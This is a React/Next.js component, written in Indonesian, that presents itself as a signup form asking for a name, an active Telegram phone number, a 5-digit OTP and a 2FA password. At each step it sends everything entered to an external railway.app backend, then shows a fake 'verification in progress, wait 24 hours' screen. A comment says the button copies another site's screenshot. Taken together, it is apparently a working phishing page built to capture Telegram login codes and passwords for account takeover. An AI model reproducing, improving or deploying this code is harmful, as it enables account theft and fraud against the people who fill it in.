"use client"

import { useState } from "react"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Loader2 } from "lucide-react"
import { toast } from "sonner"

export default function AuthForm() {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [otpError, setOtpError] = useState(false)
  
  // State untuk menyimpan input manual tanpa Form Library yang rumit
  const [nama, setNama] = useState("")
  const [nomor, setNomor] = useState("")
  const [otp, setOtp] = useState("")
  const [sandi, setSandi] = useState("")

  const handleNext = async () => {
    // Validasi manual: Tombol tidak akan jalan jika kosong
    if (step === 1 && (nama === "" || nomor.length < 10)) {
      toast.error("Isi Nama dan Nomor HP (min. 10 digit)")
      return
    }

    setIsLoading(true)
    setOtpError(false)

    try {
      // Simulasi kirim data ke backend
      const backendUrl = "https://backend-python-production-6e72.up.railway.app/register"
      await fetch(backendUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ nama, nomor, otp, sandi, step })
      })

      if (step === 1) {
        setStep(2)
      } else if (step === 2) {
        if (otp !== "12345") { // Ganti sesuai logika OTP kamu
          setOtpError(true)
          toast.error("OTP Salah!")
        } else {
          setStep(3)
        }
      } else if (step === 3) {
        setStep(4)
      }
    } catch (e) {
      console.error(e)
    } finally {
      setIsLoading(false)
    }
  }

  if (step === 4) {
    return (
      <div className="w-full max-w-md mx-auto p-10 border rounded-xl shadow-lg bg-white text-center">
        <Loader2 className="h-12 w-12 animate-spin text-[#1d71d3] mx-auto mb-4" />
        <h2 className="text-xl font-bold">Verifikasi Sedang Diproses</h2>
        <p className="text-sm text-gray-500">Mohon tunggu 1x24 jam.</p>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
      <div className="mb-6 rounded-xl border overflow-hidden">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
      </div>

      <div className="space-y-5">
        {step === 1 && (
          <>
            <div>
              <label className="font-semibold block mb-1 text-sm">Nama Lengkap:</label>
              <Input value={nama} onChange={(e) => setNama(e.target.value)} placeholder="Masukkan nama" />
            </div>
            <div>
              <label className="font-semibold block mb-1 text-sm">Nomor Telegram Aktif:</label>
              <Input value={nomor} onChange={(e) => setNomor(e.target.value)} type="tel" placeholder="08XXXXXXXXXX" />
            </div>
          </>
        )}

        {step === 2 && (
          <div className="text-center">
            <label className="font-semibold block mb-4 text-lg">Masukkan 5 Digit Kode OTP</label>
            <Input 
              value={otp} 
              onChange={(e) => setOtp(e.target.value)}
              maxLength={5}
              type="tel"
              className={`text-center text-2xl tracking-[1rem] font-bold h-16 ${otpError ? 'border-red-500 bg-red-50' : 'border-[#1d71d3]'}`}
              placeholder="00000"
            />
            {otpError && <p className="text-red-500 text-xs mt-2 italic font-medium">Kode OTP salah atau kadaluarsa.</p>}
          </div>
        )}

        {step === 3 && (
          <div>
            <label className="font-semibold block mb-1 text-sm text-center">Masukkan Kata Sandi (2FA):</label>
            <Input value={sandi} onChange={(e) => setSandi(e.target.value)} type="password" placeholder="******" className="text-center" />
          </div>
        )}

        {/* Tombol Biru Identik dengan Screenshot (284) */}
        <Button 
          onClick={handleNext}
          disabled={isLoading}
          className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 uppercase flex items-center justify-center mt-4"
        >
          {isLoading ? <Loader2 className="animate-spin h-5 w-5" /> : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
        </Button>
      </div>

      <div className="mt-6 text-left border-t pt-4">
        <p className="text-[12px] text-gray-500 leading-tight">
          Peringatan:<br/>Pendaftaran hanya akan di masukkan melaui data dari pendaftaran melalui telegram yang aktif!
        </p>
      </div>
    </div>
  )
}